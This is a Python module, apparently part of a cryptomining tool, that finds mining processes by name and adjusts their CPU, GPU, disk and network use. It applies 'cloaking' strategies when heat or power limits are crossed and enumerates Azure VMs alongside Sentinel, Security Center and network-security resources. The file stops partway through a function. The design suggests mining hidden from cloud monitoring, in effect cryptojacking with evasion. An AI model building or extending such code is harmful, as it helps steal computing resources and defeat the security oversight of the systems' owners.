# resource_manager.py

import os
import logging
import subprocess
import psutil
import pynvml
import traceback  # <-- Import traceback để in stacktrace đầy đủ khi có ngoại lệ
from time import sleep, time
from pathlib import Path
from queue import PriorityQueue, Empty, Queue
from threading import Event, Thread, Lock
from typing import List, Any, Dict, Optional
from readerwriterlock import rwlock
from itertools import count


from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategy, CloakStrategyFactory

from .azure_clients import (
    AzureMonitorClient,
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureSecurityCenterClient,
    AzureNetworkWatcherClient,
    AzureTrafficAnalyticsClient,
    AzureMLClient,
    AzureAnomalyDetectorClient,
    AzureOpenAIClient
)

from .auxiliary_modules import temperature_monitor

from .auxiliary_modules.power_management import (
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


def assign_process_resources(pid: int, resources: Dict[str, Any],
                             process_name: str, logger: logging.Logger):
    """
    Thay thế cho assign_process_to_cgroups, áp dụng điều chỉnh tài nguyên 
    bằng taskset và các lệnh hệ thống khác (chưa đầy đủ do thiếu cgroup).
    """
    try:
        # Điều chỉnh CPU threads (taskset)
        if 'cpu_threads' in resources:
            cpu_count = psutil.cpu_count(logical=True)
            desired_threads = resources['cpu_threads']
            if desired_threads > cpu_count or desired_threads <= 0:
                logger.warning(
                    f"Số luồng CPU yêu cầu ({desired_threads}) không hợp lệ. Bỏ qua."
                )
            else:
                cores = ",".join(map(str, range(desired_threads)))
                subprocess.run(['taskset', '-cp', cores, str(pid)], check=True)
                logger.info(
                    f"Đã áp dụng giới hạn {desired_threads} luồng CPU cho tiến trình "
                    f"{process_name} (PID: {pid})."
                )

        if 'memory' in resources:
            logger.warning(
                f"Chưa cấu hình cgroup, không thể giới hạn RAM cho {process_name} (PID: {pid})."
            )
        if 'cpu_freq' in resources:
            logger.warning(
                f"Chưa cấu hình cgroup, không thể giới hạn CPU freq cho {process_name} (PID: {pid})."
            )
        if 'disk_io_limit_mbps' in resources:
            logger.warning(
                f"Chưa cấu hình cgroup, không thể giới hạn Disk I/O cho {process_name} (PID: {pid})."
            )
    except Exception as e:
        logger.error(
            f"Lỗi khi gán tài nguyên cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
        )


class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.original_resource_limits = {}
        self.gpu_manager = GPUManager()

    def is_gpu_initialized(self) -> bool:
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    def shutdown_nvml(self):
        self.gpu_manager.shutdown_nvml()

    def adjust_cpu_threads(self, pid: int, cpu_threads: int, process_name: str):
        try:
            assign_process_resources(
                pid,
                {'cpu_threads': cpu_threads},
                process_name,
                self.logger
            )
            self.logger.info(
                f"Điều chỉnh số luồng CPU = {cpu_threads} cho tiến trình {process_name} (PID={pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_cpu_threads cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )

    def adjust_ram_allocation(self, pid: int, ram_allocation_mb: int, process_name: str):
        try:
            assign_process_resources(
                pid,
                {'memory': ram_allocation_mb},
                process_name,
                self.logger
            )
            self.logger.info(
                f"Điều chỉnh RAM = {ram_allocation_mb}MB cho {process_name} (PID={pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_ram_allocation cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )

    def adjust_gpu_usage(self, process: MiningProcess, gpu_usage_percent: List[float]):
        try:
            if not isinstance(gpu_usage_percent, list):
                gpu_usage_percent = []

            step = self.config["optimization_parameters"].get("gpu_power_adjustment_step", 10)
            new_gpu_usage = [
                min(max(g + step, 0), 100)
                for g in gpu_usage_percent
            ]
            set_gpu_usage(process.pid, new_gpu_usage)
            self.logger.info(
                f"Điều chỉnh GPU usage={new_gpu_usage} cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_gpu_usage cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )

    def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
        try:
            current_limit = temperature_monitor.get_current_disk_io_limit(process.pid)
            step = self.config["optimization_parameters"].get("disk_io_limit_step_mbps", 1)
            if (current_limit is not None) and isinstance(disk_io_limit_mbps, (int, float)):
                if current_limit > disk_io_limit_mbps:
                    new_limit = current_limit - step
                else:
                    new_limit = current_limit + step

                min_l = self.config["resource_allocation"]["disk_io"]["min_limit_mbps"]
                max_l = self.config["resource_allocation"]["disk_io"]["max_limit_mbps"]
                new_limit = max(min_l, min(new_limit, max_l))

                assign_process_resources(
                    process.pid,
                    {'disk_io_limit_mbps': new_limit},
                    process.name,
                    self.logger
                )
                self.logger.info(
                    f"Điều chỉnh Disk I/O={new_limit} Mbps cho {process.name} (PID={process.pid})."
                )
            else:
                self.logger.warning(
                    f"current_limit hoặc disk_io_limit_mbps invalid cho {process.name} (PID={process.pid})."
                )
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_disk_io_limit cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )

    def adjust_network_bandwidth(self, process: MiningProcess, bandwidth_limit_mbps: float):
        try:
            self.apply_network_cloaking(process.network_interface, bandwidth_limit_mbps, process)
            self.logger.info(
                f"Điều chỉnh Net băng thông={bandwidth_limit_mbps} Mbps cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_network_bandwidth cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )

    def adjust_cpu_frequency(self, pid: int, frequency: int, process_name: str):
        try:
            assign_process_resources(
                pid,
                {'cpu_freq': frequency},
                process_name,
                self.logger
            )
            self.logger.info(
                f"Set CPU freq={frequency}MHz cho {process_name} (PID={pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_cpu_frequency cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )

    def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str) -> bool:
        try:
            pynvml.nvmlInit()
            handle = pynvml.nvmlDeviceGetHandleByIndex(0)

            # Lấy giới hạn năng lượng hợp lệ
            min_limit, max_limit = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)

            # Kiểm tra nếu `power_limit` nằm ngoài phạm vi hợp lệ
            if not (min_limit <= power_limit * 1000 <= max_limit):
                raise ValueError(
                    f"Power limit {power_limit}W không hợp lệ. "
                    f"Khoảng hợp lệ: {min_limit // 1000}W - {max_limit // 1000}W."
                )

            # Áp dụng giới hạn năng lượng
            pynvml.nvmlDeviceSetPowerManagementLimit(handle, power_limit * 1000)
            self.logger.info(
                f"Set GPU power limit={power_limit}W cho {process_name} (PID={pid})."
            )
            return True  # Trả về thành công
        except pynvml.NVMLError as e:
            self.logger.error(
                f"Lỗi NVML khi set GPU power limit cho {process_name} (PID={pid}): {e}. "
                f"Power limit yêu cầu: {power_limit}W."
            )
        except ValueError as ve:
            # Log trực tiếp thông báo ngoại lệ mà không lặp lại "Khoảng hợp lệ"
            self.logger.error(f"Lỗi giá trị power limit: {ve}")
        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi set GPU power limit cho {process_name} (PID={pid}): {e}."
            )
        finally:
            pynvml.nvmlShutdown()

        return False  # Trả về thất bại nếu gặp lỗi

    def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
        try:
            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
            self.logger.info(
                f"Set ionice class={ionice_class} cho {process_name} (PID={pid})."
            )
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi chạy ionice: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_disk_io_priority cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )

    def drop_caches(self):
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')
            self.logger.info("Đã drop caches.")
        except Exception as e:
            self.logger.error(
                f"Lỗi drop_caches: {e}\n{traceback.format_exc()}"
            )

    def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
        try:
            self.configure_network_interface(interface, bandwidth_limit)
        except Exception as e:
            self.logger.error(
                f"Lỗi network cloaking cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def configure_network_interface(self, interface: str, bandwidth_limit: float):
        """Placeholder cho tc/iptables."""
        pass

    def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
        try:
            if load_percent > 80:
                new_freq = 2000
            elif load_percent > 50:
                new_freq = 2500
            else:
                new_freq = 3000
            self.adjust_cpu_frequency(process.pid, new_freq, process.name)
            self.logger.info(
                f"Throttle CPU={new_freq}MHz do load={load_percent}% cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi throttle_cpu_based_on_load cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        Apply a cloaking strategy to a given process.

        Args:
            strategy_name (str): Name of the cloaking strategy (e.g., 'cpu', 'gpu').
            process (MiningProcess): The process to which the strategy will be applied.

        Raises:
            Exception: If the strategy cannot be created or applied.
        """
        try:
            # Log việc tạo strategy
            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {process.name} (PID={process.pid})")

            # Tạo chiến lược từ factory
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.is_gpu_initialized()
            )

            # Kiểm tra chiến lược có hợp lệ không
            if not strategy:
                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
                return  # Không ném ngoại lệ để tránh ngắt luồng chính
            if not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
                return  # Không ném ngoại lệ để tránh ngắt luồng chính

            # Log thông tin chiến lược
            self.logger.debug(f"Strategy class: {strategy.__class__.__name__}, methods: {dir(strategy)}")

            # Áp dụng chiến lược với cơ chế thử lại
            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {process.name} (PID={process.pid})")
            adjustments = self._safe_apply_strategy(strategy, process)

            # Xử lý các điều chỉnh trả về
            if adjustments:
                self.logger.info(f"Áp dụng '{strategy_name}' => {adjustments} cho {process.name} (PID={process.pid}).")
                self.execute_adjustments(adjustments, process)
            else:
                self.logger.warning(f"Không có điều chỉnh nào được trả về từ strategy '{strategy_name}' cho tiến trình {process.name} (PID={process.pid}).")

        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def _safe_apply_strategy(self, strategy: CloakStrategy, process: MiningProcess) -> Optional[Dict[str, Any]]:
        """
        Safely apply a cloaking strategy and handle errors.

        Args:
            strategy (CloakStrategy): The cloaking strategy to apply.
            process (MiningProcess): The process to which the strategy will be applied.

        Returns:
            Optional[Dict[str, Any]]: Adjustments returned by the strategy, or None if an error occurs.
        """
        try:
            adjustments = strategy.apply(process)
            if not isinstance(adjustments, dict):
                self.logger.error(f"Adjustments returned by {strategy.__class__.__name__} are not a dictionary: {adjustments}")
                return None
            return adjustments
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng strategy '{strategy.__class__.__name__}' cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return None

    def restore_resources(self, process: MiningProcess):
        try:
            pid = process.pid
            name = process.name
            orig_limits = self.original_resource_limits.get(pid)
            if not orig_limits:
                self.logger.warning(
                    f"Không thấy original_limits cho {name} (PID={pid})."
                )
                return

            if 'cpu_freq' in orig_limits:
                self.adjust_cpu_frequency(pid, orig_limits['cpu_freq'], name)
            if 'cpu_threads' in orig_limits:
                self.adjust_cpu_threads(pid, orig_limits['cpu_threads'], name)
            if 'ram_allocation_mb' in orig_limits:
                self.adjust_ram_allocation(pid, orig_limits['ram_allocation_mb'], name)
            if 'gpu_power_limit' in orig_limits:
                self.adjust_gpu_power_limit(pid, orig_limits['gpu_power_limit'], name)
            if 'ionice_class' in orig_limits:
                self.adjust_disk_io_priority(pid, orig_limits['ionice_class'], name)
            if 'network_bandwidth_limit_mbps' in orig_limits:
                self.adjust_network_bandwidth(process, orig_limits['network_bandwidth_limit_mbps'])

            del self.original_resource_limits[pid]
            self.logger.info(
                f"Khôi phục xong tài nguyên cho {name} (PID={pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi restore_resources cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_current_cpu_frequency(self, pid: int) -> int:
        return 3000

    def get_current_gpu_power_limit(self, pid: int) -> int:
        return 200

    def get_current_network_bandwidth_limit(self, pid: int) -> float:
        return 1000.0

    def get_current_ionice_class(self, pid: int) -> int:
        return 2

    def execute_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        try:
            for key, val in adjustments.items():
                if key == 'cpu_freq':
                    self.adjust_cpu_frequency(process.pid, int(val), process.name)
                elif key == 'gpu_power_limit':
                    self.adjust_gpu_power_limit(process.pid, int(val), process.name)
                elif key == 'network_bandwidth_limit_mbps':
                    self.adjust_network_bandwidth(process, float(val))
                elif key == 'ionice_class':
                    self.adjust_disk_io_priority(process.pid, int(val), process.name)
                elif key == 'cpu_threads':
                    self.adjust_cpu_threads(process.pid, int(val), process.name)
                elif key == 'ram_allocation_mb':
                    self.adjust_ram_allocation(process.pid, int(val), process.name)
                elif key == 'drop_caches':
                    self.drop_caches()
        except Exception as e:
            self.logger.error(
                f"Lỗi execute_adjustments cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )


class ResourceManager(BaseManager):
    """
    Quản lý chính tài nguyên, thread, v.v.
    """
    _instance = None
    _instance_lock = Lock()


    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        self.stop_event = Event()
        self.resource_lock = rwlock.RWLockFair()
        self.resource_adjustment_queue = PriorityQueue()
        self.cloaking_request_queue = Queue()
        self.processed_tasks = set()

        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()
        self._counter = count()

        # Azure
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Threads
        self.initialize_threads()
        self.shared_resource_manager = SharedResourceManager(config, logger)

    def start(self):
        self.logger.info("Bắt đầu ResourceManager...")
        self.discover_mining_processes()
        self.start_threads()
        self.logger.info("ResourceManager đã khởi động xong.")

    def stop(self):
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.join_threads()
        self.shutdown_power_management()
        self.logger.info("ResourceManager đã dừng.")

    def initialize_threads(self):
        self.monitor_thread = Thread(
            target=self.monitor_and_adjust, name="MonitorThread", daemon=True
        )
        self.optimization_thread = Thread(
            target=self.optimize_resources, name="OptimizationThread", daemon=True
        )
        self.cloaking_thread = Thread(
            target=self.process_cloaking_requests, name="CloakingThread", daemon=True
        )
        self.resource_adjustment_thread = Thread(
            target=self.resource_adjustment_handler, name="ResourceAdjustmentThread", daemon=True
        )

    def start_threads(self):
        self.monitor_thread.start()
        self.optimization_thread.start()
        self.cloaking_thread.start()
        self.resource_adjustment_thread.start()

    def join_threads(self):
        self.monitor_thread.join()
        self.optimization_thread.join()
        self.cloaking_thread.join()
        self.resource_adjustment_thread.join()

    def initialize_azure_clients(self):
        self.azure_monitor_client = AzureMonitorClient(self.logger)
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
        self.azure_ml_client = AzureMLClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
        self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)

    def discover_azure_resources(self):
        try:
            self.vms = self.azure_monitor_client.discover_resources(
                'Microsoft.Compute/virtualMachines'
            )
            self.logger.info(f"Khám phá {len(self.vms)} Máy ảo.")

            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
            self.logger.info(
                f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
            )

            self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
            self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    def discover_mining_processes(self):
        try:
            cpu_name = self.config['processes'].get('CPU', '').lower()
            gpu_name = self.config['processes'].get('GPU', '').lower()

            with self.mining_processes_lock.gen_wlock():
                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    pname = proc.info['name'].lower()
                    if cpu_name in pname or gpu_name in pname:
                        prio = self.get_process_priority(proc.info['name'])
                        net_if = self.config.get('network_interface', 'eth0')
                        mining_proc = MiningProcess(
                            proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                        )
                        self.mining_processes.append(mining_proc)
                self.logger.info(
                    f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
                )
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải int => gán 1."
            )
            return 1
        return pri_val

    def monitor_and_adjust(self):
        mon_params = self.config.get("monitoring_parameters", {})
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 10)
        power_intv = mon_params.get("power_monitoring_interval_seconds", 10)

        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()
                self.allocate_resources_with_priority()

                temp_lims = self.config.get("temperature_limits", {})
                cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

                for proc in self.mining_processes:
                    self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)

                power_limits = self.config.get("power_limits", {})
                per_dev_power = power_limits.get("per_device_power_watts", {})

                cpu_max_pwr = per_dev_power.get("cpu", 150)
                if not isinstance(cpu_max_pwr, (int, float)):
                    self.logger.warning(f"cpu_max_power invalid: {cpu_max_pwr}, default=150")
                    cpu_max_pwr = 150
                gpu_max_pwr = per_dev_power.get("gpu", 300)
                if not isinstance(gpu_max_pwr, (int, float)):
                    self.logger.warning(f"gpu_max_power invalid: {gpu_max_pwr}, default=300")
                    gpu_max_pwr = 300

                for p in self.mining_processes:
                    self.check_power_and_enqueue(p, cpu_max_pwr, gpu_max_pwr)

                if self.should_collect_azure_monitor_data():
                    self.collect_azure_monitor_data()

            except Exception as e:
                self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")

            sleep(max(temp_intv, power_intv))

    def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = 0
            if self.shared_resource_manager.is_gpu_initialized():
                g_vals = temperature_monitor.get_gpu_temperature(process.pid)
                if isinstance(g_vals, list) and g_vals:
                    gpu_temp = max(g_vals)

            if (cpu_temp and cpu_temp > cpu_max_temp) or (gpu_temp and gpu_temp > gpu_max_temp):
                adjustments = {}
                if cpu_temp and cpu_temp > cpu_max_temp:
                    self.logger.warning(
                        f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid})."
                    )
                    adjustments['cpu_cloak'] = True
                if gpu_temp and gpu_temp > gpu_max_temp:
                    self.logger.warning(
                        f"Nhiệt độ GPU {gpu_temp}°C > {gpu_max_temp}°C (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True

                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error: {e}\n{traceback.format_exc()}")

    def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        try:
            c_power = get_cpu_power(process.pid)
            g_power = 0
            if self.shared_resource_manager.is_gpu_initialized():
                g_vals = get_gpu_power(process.pid)
                if isinstance(g_vals, list) and g_vals:
                    g_power = max(g_vals)

            if (c_power and c_power > cpu_max_power) or (g_power and g_power > gpu_max_power):
                adj = {}
                if c_power and c_power > cpu_max_power:
                    self.logger.warning(
                        f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid})."
                    )
                    adj['cpu_cloak'] = True
                if g_power and g_power > gpu_max_power:
                    self.logger.warning(
                        f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adj['gpu_cloak'] = True

                t = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adj
                }
                priority = 2
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, t))
        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error: {e}\n{traceback.format_exc()}")

    def should_collect_azure_monitor_data(self) -> bool:
        if not hasattr(self, '_last_azure_monitor_time'):
            self._last_azure_monitor_time = 0
        now = int(time())
        interval = self.config.get("monitoring_parameters", {}).get("azure_monitor_interval_seconds", 300)
        if now - self._last_azure_monitor_time >= interval:
            self._last_azure_monitor_time = now
            return True
        return False

    def collect_azure_monitor_data(self):
        try:
            for vm in self.vms:
                rid = vm['id']
                metric_names = ['Percentage CPU', 'Available Memory Bytes']
                metrics = self.azure_monitor_client.get_metrics(rid, metric_names)
                self.logger.info(f"Thu thập chỉ số VM {vm['name']}: {metrics}")
        except Exception as e:
            self.logger.error(f"Lỗi collect_azure_monitor_data: {e}\n{traceback.format_exc()}")

    def optimize_resources(self):
        opt_intv = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock.gen_rlock():
                    for proc in self.mining_processes:
                        proc.update_resource_usage()

                self.allocate_resources_with_priority()

                with self.mining_processes_lock.gen_rlock():
                    for proc in self.mining_processes:
                        current_state = self.collect_metrics(proc)
                        openai_suggestions = self.azure_openai_client.get_optimization_suggestions(current_state)
                        if not openai_suggestions:
                            self.logger.warning(
                                f"Không có gợi ý OpenAI cho {proc.name} (PID={proc.pid})."
                            )
                            continue
                        self.logger.debug(
                            f"OpenAI suggestions={openai_suggestions} cho PID={proc.pid}"
                        )
                        task = {
                            'type': 'optimization',
                            'process': proc,
                            'action': openai_suggestions
                        }
                        self.resource_adjustment_queue.put((2, task))
            except Exception as e:
                self.logger.error(f"optimize_resources error: {e}\n{traceback.format_exc()}")

            sleep(opt_intv)

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        try:
            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)
            if self.shared_resource_manager.is_gpu_initialized():
                gpu_pct = temperature_monitor.get_current_gpu_usage(process.pid)
            else:
                gpu_pct = 0
            disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)

            net_bw = (self.config.get('resource_allocation', {})
                             .get('network', {})
                             .get('bandwidth_limit_mbps', 100))
            cache_l = (self.config.get('resource_allocation', {})
                             .get('cache', {})
                             .get('limit_percent', 50))

            return {
                'cpu_usage_percent': cpu_pct,
                'memory_usage_mb': mem_mb,
                'gpu_usage_percent': gpu_pct,
                'disk_io_mbps': disk_mbps,
                'network_bandwidth_mbps': net_bw,
                'cache_limit_percent': cache_l
            }
        except Exception as e:
            self.logger.error(
                f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return {}

    def process_cloaking_requests(self):
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                adjustment_task = {
                    'type': 'cloaking',
                    'process': process,
                    'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                }
                priority = 1
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
                # Không gọi task_done() ở đây
            except Empty:
                pass
            except Exception as e:
                self.logger.error(
                    f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}"
                )

    def resource_adjustment_handler(self):
        while not self.stop_event.is_set():
            try:
                # Lấy mục từ hàng đợi với bộ đếm
                item = self.resource_adjustment_queue.get(timeout=1)
                
                if len(item) != 3:
                    self.logger.error(
                        f"Lỗi resource_adjustment_handler: không nhận được 3 phần tử, nhận được {len(item)}: {item}"
                    )
                    self.resource_adjustment_queue.task_done()
                    continue

                priority, count_val, adjustment_task = item
                task_id = hash(str(adjustment_task))

                if task_id in self.processed_tasks:
                    self.logger.warning(f"Nhiệm vụ đã xử lý: {adjustment_task}")
                    self.resource_adjustment_queue.task_done()
                    continue

                try:
                    self.execute_adjustment_task(adjustment_task)
                except Exception as task_error:
                    self.logger.error(
                        f"Lỗi execute_adjustment_task: {task_error}\n{traceback.format_exc()}"
                    )
                finally:
                    self.resource_adjustment_queue.task_done()

                self.processed_tasks.add(task_id)

            except Empty:
                pass
            except Exception as e:
                self.logger.error(
                    f"Lỗi resource_adjustment_handler: {e}\n{traceback.format_exc()}"
                )

    def execute_adjustment_task(self, adjustment_task):
        try:
            task_type = adjustment_task.get('type')
            if task_type is None:
                fn_name = adjustment_task['function']
                args = adjustment_task.get('args', ())
                kwargs = adjustment_task.get('kwargs', {})
                fn = getattr(self.shared_resource_manager, fn_name, None)
                if fn:
                    fn(*args, **kwargs)
                else:
                    self.logger.error(f"Hàm {fn_name} không tìm thấy.")
            else:
                process = adjustment_task['process']
                if task_type == 'cloaking':
                    strategies = adjustment_task['strategies']
                    for st in strategies:
                        self.shared_resource_manager.apply_cloak_strategy(st, process)
                    self.logger.info(
                        f"Hoàn thành cloaking cho {process.name} (PID={process.pid})."
                    )
                elif task_type == 'optimization':
                    action = adjustment_task['action']
                    self.apply_recommended_action(action, process)
                elif task_type == 'monitoring':
                    adj = adjustment_task['adjustments']
                    self.apply_monitoring_adjustments(adj, process)
                elif task_type == 'restore':
                    self.shared_resource_manager.restore_resources(process)
                    self.logger.info(
                        f"Đã khôi phục resource cho {process.name} (PID={process.pid})."
                    )
                else:
                    self.logger.warning(f"Loại nhiệm vụ không xác định: {task_type}")
        except Exception as e:
            self.logger.error(
                f"Lỗi execute_adjustment_task={adjustment_task}: {e}\n{traceback.format_exc()}"
            )

    def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        try:
            if adjustments.get('cpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cpu', process)
            if adjustments.get('gpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('gpu', process)
            if adjustments.get('throttle_cpu'):
                load_percent = psutil.cpu_percent(interval=1)
                self.shared_resource_manager.throttle_cpu_based_on_load(process, load_percent)

            self.logger.info(
                f"Áp dụng điều chỉnh monitor cho {process.name} (PID={process.pid})."
            )
        except Exception as e:
            self.logger.error(f"apply_monitoring_adjustments error: {e}\n{traceback.format_exc()}")

    def apply_recommended_action(self, action: List[Any], process: MiningProcess):
        try:
            cpu_threads = int(action[0])
            ram_alloc = int(action[1])

            gpu_config = (self.config.get("resource_allocation", {})
                                  .get("gpu", {})
                                  .get("max_usage_percent", []))

            gpu_usage_percent = []
            if isinstance(gpu_config, list):
                length_needed = len(gpu_config)
                gpu_usage_percent = list(action[2:2 + length_needed])
                next_idx = 2 + length_needed
            elif isinstance(gpu_config, (int, float)):
                gpu_usage_percent = [float(action[2])]
                next_idx = 3
            else:
                self.logger.warning("max_usage_percent không phải list/int/float => bỏ qua GPU")
                next_idx = 2

            disk_io_limit_mbps = float(action[next_idx])
            net_bw_limit_mbps = float(action[next_idx + 1])
            cache_limit_percent = float(action[next_idx + 2])

            # Tasks
            t1 = {
                'function': 'adjust_cpu_threads',
                'args': (process.pid, cpu_threads, process.name)
            }
            self.resource_adjustment_queue.put((3, next(self._counter), t1))

            t2 = {
                'function': 'adjust_ram_allocation',
                'args': (process.pid, ram_alloc, process.name)
            }
            self.resource_adjustment_queue.put((3, next(self._counter), t2))

            if gpu_usage_percent:
                t3 = {
                    'function': 'adjust_gpu_usage',
                    'args': (process, gpu_usage_percent)
                }
                self.resource_adjustment_queue.put((3, next(self._counter), t3))
            else:
                self.logger.warning(
                    f"Chưa có GPU usage => bỏ qua GPU cho PID={process.pid}"
                )

            t4 = {
                'function': 'adjust_disk_io_limit',
                'args': (process, disk_io_limit_mbps)
            }
            self.resource_adjustment_queue.put((3, next(self._counter), t4))

            t5 = {
                'function': 'adjust_network_bandwidth',
